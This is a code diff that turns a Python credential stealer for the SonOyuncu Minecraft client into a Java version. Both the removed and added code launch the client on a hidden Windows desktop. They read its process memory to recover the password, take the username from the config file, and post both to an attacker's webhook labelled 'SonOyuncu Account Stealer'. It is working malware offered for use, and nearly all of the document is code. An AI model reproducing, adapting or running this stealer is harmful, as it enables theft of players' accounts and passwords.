@@ -1,150 +1,209 @@
-import json
+import java.io.File;
+import java.io.IOException;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
-import requests, ctypes, psutil, pymem, time, re, os
-from ctypes import wintypes
+import com.google.gson.Gson;
+import com.google.gson.JsonObject;
+import com.sun.jna.Memory;
+import com.sun.jna.Native;
+import com.sun.jna.Pointer;
+import com.sun.jna.platform.win32.Kernel32;
+import com.sun.jna.platform.win32.User32;
+import com.sun.jna.platform.win32.WinBase.PROCESS_INFORMATION;
+import com.sun.jna.platform.win32.WinBase.STARTUPINFO;
+import com.sun.jna.platform.win32.WinNT.HANDLE;
+//import com.sun.jna.platform.win32.WinDef.WORD; Wrong İmport :D
+import com.sun.jna.platform.win32.WinDef.WORD;
+import com.sun.jna.ptr.IntByReference;
+import com.sun.jna.win32.W32APIOptions;
 
-"""
-@author: ItzGonza
-@version: 2.0
-@date: 2025-04-14
-"""
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.entity.StringEntity;
+import org.apache.http.impl.client.CloseableHttpClient;
+import org.apache.http.impl.client.HttpClients;
 
-APPLICATION_PATH = os.path.expandvars('%APPDATA%') + '/.sonoyuncu/sonoyuncuclient.exe'
-CONFIG_PATH = os.path.expandvars('%APPDATA%') + '/.sonoyuncu/config.json'
-WEBHOOK_URL = 'UR_WEBHOOK_URL'
+public class Main {
+    private static final String APPLICATION_PATH = System.getenv("APPDATA") + "/.sonoyuncu/sonoyuncuclient.exe";
+    private static final String CONFIG_PATH = System.getenv("APPDATA") + "/.sonoyuncu/config.json";
+    private static final String WEBHOOK_URL = "UR_URL_HERE";
 
-class AccountStealer:
+    private User32 user32;
+    private Kernel32 kernel32;
+    private String desktopName;
+    private HANDLE hiddenDesktop;
+    private PROCESS_INFORMATION processInfo;
 
-    def __init__(self):
-        self.kernel32 = ctypes.WinDLL('kernel32')
-        self.user32 = ctypes.WinDLL('user32')
-        self.desktop_name = "HiddenDesktop"
-        self.hidden_desktop = None
-        self.process_info = None
+    public interface ExtendedUser32 extends User32 {
+        ExtendedUser32 INSTANCE = Native.load("user32", ExtendedUser32.class, W32APIOptions.DEFAULT_OPTIONS);
+        HANDLE CreateDesktopW(String desktop, String device, String deviceMode, int flags, int desiredAccess, Pointer securityAttributes);
+        boolean CloseDesktop(HANDLE hDesktop);
+    }
 
-    def launch_application(self):
-        class STARTUPINFO(ctypes.Structure):
-            _fields_ = [
-                ('cb', wintypes.DWORD),
-                ('lpReserved', wintypes.LPWSTR),
-                ('lpDesktop', wintypes.LPWSTR),
-                ('lpTitle', wintypes.LPWSTR),
-                ('dwX', wintypes.DWORD),
-                ('dwY', wintypes.DWORD),
-                ('dwXSize', wintypes.DWORD),
-                ('dwYSize', wintypes.DWORD),
-                ('dwXCountChars', wintypes.DWORD),
-                ('dwYCountChars', wintypes.DWORD),
-                ('dwFillAttribute', wintypes.DWORD),
-                ('dwFlags', wintypes.DWORD),
-                ('wShowWindow', wintypes.WORD),
-                ('cbReserved2', wintypes.WORD),
-                ('lpReserved2', ctypes.POINTER(wintypes.BYTE)),
-                ('hStdInput', wintypes.HANDLE),
-                ('hStdOutput', wintypes.HANDLE),
-                ('hStdError', wintypes.HANDLE)
-            ]
+    public interface ExtendedKernel32 extends Kernel32 {
+        ExtendedKernel32 INSTANCE = Native.load("kernel32", ExtendedKernel32.class, W32APIOptions.DEFAULT_OPTIONS);
+        boolean CreateProcessW(String lpApplicationName, String lpCommandLine, Pointer lpProcessAttributes, Pointer lpThreadAttributes, boolean bInheritHandles, int dwCreationFlags, Pointer lpEnvironment, String lpCurrentDirectory, STARTUPINFO lpStartupInfo, PROCESS_INFORMATION lpProcessInformation);
+    }
 
-        class PROCESS_INFORMATION(ctypes.Structure):
-            _fields_ = [
-                ('hProcess', wintypes.HANDLE),
-                ('hThread', wintypes.HANDLE),
-                ('dwProcessId', wintypes.DWORD),
-                ('dwThreadId', wintypes.DWORD)
-            ]
+    public Main() {
+        this.kernel32 = ExtendedKernel32.INSTANCE;
+        this.user32 = ExtendedUser32.INSTANCE;
+        this.desktopName = "HiddenDesktop";
+        this.hiddenDesktop = null;
+        this.processInfo = null;
+    }
 
-        startup_info = STARTUPINFO()
-        startup_info.cb = ctypes.sizeof(STARTUPINFO)
-        startup_info.lpDesktop = self.desktop_name
-        startup_info.dwFlags = 0x00000001
-        startup_info.wShowWindow = 0
+    private PROCESS_INFORMATION launchApplication() {
+        STARTUPINFO startupInfo = new STARTUPINFO();
+        startupInfo.dwFlags = 0x00000001;
+        startupInfo.wShowWindow = new WORD(0);
+        startupInfo.lpDesktop = desktopName;
 
-        process_info = PROCESS_INFORMATION()
-        success = self.kernel32.CreateProcessW(None, APPLICATION_PATH, None, None, False, 0x08000000, None, None, ctypes.byref(startup_info), ctypes.byref(process_info))
+        PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
+        if (!((ExtendedKernel32) kernel32).CreateProcessW(null, APPLICATION_PATH, null, null, false, 0x08000000, null, null, startupInfo, processInfo)) {
+            ((ExtendedUser32) user32).CloseDesktop(this.hiddenDesktop);
+            return null;
+        }
+        return processInfo;
+    }
 
-        if not success:
-            self.user32.CloseDesktop(self.hidden_desktop)
-            raise ctypes.WinError()
+    private void cleanup(int processId) {
+        try {
+            new ProcessBuilder("taskkill", "/F", "/PID", String.valueOf(processId)).start().waitFor();
+        } catch (Exception ignored) {}
+        if (processInfo != null) {
+            kernel32.CloseHandle(processInfo.hProcess);
+            kernel32.CloseHandle(processInfo.hThread);
+        }
+        if (hiddenDesktop != null) {
+            ((ExtendedUser32) user32).CloseDesktop(hiddenDesktop);
+        }
+    }
 
-        return process_info
+    private byte[] readProcessMemory(int processId, long address, int size) {
+        IntByReference bytesRead = new IntByReference(0);
+        byte[] buffer = new byte[size];
+        Memory memory = new Memory(size);
 
-    def create_hidden_desktop(self):
-        hidden_desktop = self.user32.CreateDesktopW(self.desktop_name, None, None, 0, (0x00000020 | 0x00000040 | 0x00000100 | 0x10000000), None)
+        HANDLE hProcess = kernel32.OpenProcess(0x0010 | 0x0020, false, processId);
+        if (hProcess != null) {
+            try {
+                if (!kernel32.ReadProcessMemory(hProcess, new Pointer(address), memory, size, bytesRead))
+                    return null;
+                memory.read(0, buffer, 0, size);
+                return buffer;
+            } finally {
+                kernel32.CloseHandle(hProcess);
+            }
+        }
+        return null;
+    }
 
-        if not hidden_desktop:
-            raise ctypes.WinError()
+    private long getModuleBaseAddress(int processId) {
+        try {
+            Process process = new ProcessBuilder("powershell",
+                    "-Command",
+                    "$m = (Get-Process -Id " + processId + ").Modules | Where-Object { $_.ModuleName -eq 'sonoyuncuclient.exe' }; " +
+                            "if ($m) { $m.BaseAddress.ToInt64() } else { 0 }"
+            ).start();
 
-        return hidden_desktop
+            String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8).trim();
+            process.waitFor();
+            return Long.parseLong(output);
+        } catch (Exception e) {
+            return 0;
+        }
+    }
 
-    def extract_credentials(self):
-        try:
-            self.hidden_desktop = self.create_hidden_desktop()
-            self.process_info = self.launch_application()
+    private String[] extractMemoryCredentials(int processId) {
+        long[] offsets = {0x1CA9B0L, 0x1CA900L, 0x1CAA00L, 0x1CA800L, 0x1CAB00L};
+        long startTime = System.currentTimeMillis();
 
-            return self.extract_memory_credentials(self.process_info.dwProcessId)
-        finally:
-            if self.process_info:
-                self.cleanup(self.process_info.dwProcessId)
+        while (System.currentTimeMillis() - startTime < 15000) {
+            long baseAddress = getModuleBaseAddress(processId);
+            if (baseAddress == 0) continue;
 
-    def extract_memory_credentials(self, process_id):
-        start_time = time.time()
+            for (long offset : offsets) {
+                byte[] memory = readProcessMemory(processId, baseAddress + offset, 512);
+                if (memory == null) continue;
 
-        while True:
-            if time.time() - start_time > 10:
-                break
+                StringBuilder clean = new StringBuilder();
+                for (byte b : memory) {
+                    int value = b & 0xFF;
+                    if (value >= 32 && value <= 126) {
+                        clean.append((char) value);
+                    } else if (value == 0 && clean.length() > 0) {
+                        break;
+                    }
+                }
 
-            try:
-                process_memory = pymem.Pymem(process_id)
-                base_address = pymem.process.module_from_name(process_memory.process_handle, "sonoyuncuclient.exe").lpBaseOfDll
-
-                password = re.search(r'[A-Za-z0-9._\-@+#$%^&*=!?~\'\",\\|/:<>[\]{}()]{1,128}', process_memory.read_bytes(base_address + 0x1C6900, 100).decode('utf-8', errors='ignore')).group(0)
-
-                return json.load(open(CONFIG_PATH))["userName"], password
-            except:
-                time.sleep(0.1)
-                continue
-
-    def cleanup(self, process_id):
-        psutil.Process(process_id).terminate()
-
-        if self.process_info:
-            self.kernel32.CloseHandle(self.process_info.hProcess)
-            self.kernel32.CloseHandle(self.process_info.hThread)
-
-        if self.hidden_desktop:
-            self.user32.CloseDesktop(self.hidden_desktop)
-
-
-def send_webhook(acc):
-    if not acc:
-        return
-
-    payload = {
-        "username": "hrsz",
-        "embeds": [
-            {
-                "title": "SonOyuncu Account Stealer :dash:",
-                "color": 65505,
-                "description": (
-                    f"a new bait has been spotted :woozy_face:\n\n"
-                    f":small_blue_diamond:Username **{acc[0]}**\n"
-                    f":small_blue_diamond:Password **{acc[1]}**"
-                ),
-                "thumbnail": {
-                    "url": f"https://www.minotar.net/avatar/{acc[0]}"
-                },
-                "footer": {
-                    "text": "github.com/itzgonza",
-                    "icon_url": "https://avatars.githubusercontent.com/u/61884903"
+                if (clean.length() > 0) {
+                    Matcher matcher = Pattern.compile("[A-Za-z0-9._\\-@+#$%^&*=!?~'\",\\\\|/:<>\\[\\]{}()]{3,64}").matcher(clean.toString());
+                    if (matcher.find()) {
+                        try {
+                            String json = Files.readString(Paths.get(CONFIG_PATH));
+                            String username = new Gson().fromJson(json, JsonObject.class).get("userName").getAsString();
+                            return new String[]{username, matcher.group()};
+                        } catch (IOException ignored) {}
+                    }
                 }
             }
-        ]
+
+            try {
+                Thread.sleep(500);
+            } catch (InterruptedException ignored) {}
+        }
+        return null;
     }
-    return requests.post(WEBHOOK_URL, json=payload).status_code == 204
 
+    public String[] extractCredentials() {
+        try {
+            this.hiddenDesktop = ((ExtendedUser32) user32).CreateDesktopW(desktopName, null, null, 0, 0x00000002 | 0x00000080 | 0x00000001 | 0x10000000, null);
+            this.processInfo = launchApplication();
+            if (this.processInfo == null) return null;
+            return extractMemoryCredentials(processInfo.dwProcessId.intValue());
+        } finally {
+            if (processInfo != null) {
+                cleanup(processInfo.dwProcessId.intValue());
+            }
+        }
+    }
 
-if __name__ == "__main__":
-    if os.path.exists(APPLICATION_PATH):
-        account = AccountStealer()
-        if send_webhook(account.extract_credentials()):
-            print('succesfully ~> {}:{}'.format(*account.extract_credentials()))
+    private static boolean sendWebhook(String[] credentials) {
+        if (credentials == null) return false;
+
+        try (CloseableHttpClient client = HttpClients.createDefault()) {
+            HttpPost request = new HttpPost(WEBHOOK_URL);
+            String json = String.format(
+                    "{" +
+                            "\"username\": \"hrsz\"," +
+                            "\"embeds\": [{" +
+                            "\"title\": \"SonOyuncu Account Stealer\"," +
+                            "\"color\": 65505," +
+                            "\"description\": \"Username: **%s**\\nPassword: **%s**\"," +
+                            "\"thumbnail\": {\"url\": \"https://www.minotar.net/avatar/%s\"}," +
+                            "\"footer\": {\"text\": \"github.com/itzgonza\",\"icon_url\": \"https://avatars.githubusercontent.com/u/61884903\"}" +
+                            "}]}",
+                    credentials[0], credentials[1], credentials[0]
+            );
+            request.setEntity(new StringEntity(json));
+            request.setHeader("Content-Type", "application/json");
+            return client.execute(request).getStatusLine().getStatusCode() == 204;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    public static void main(String[] args) {
+        if (new File(APPLICATION_PATH).exists()) {
+            Main stealer = new Main();
+            String[] creds = stealer.extractCredentials();
+            if (sendWebhook(creds)) {
+                System.out.println("successfully ~> " + creds[0] + ":" + creds[1]);
+            }
+        }
+    }
+}
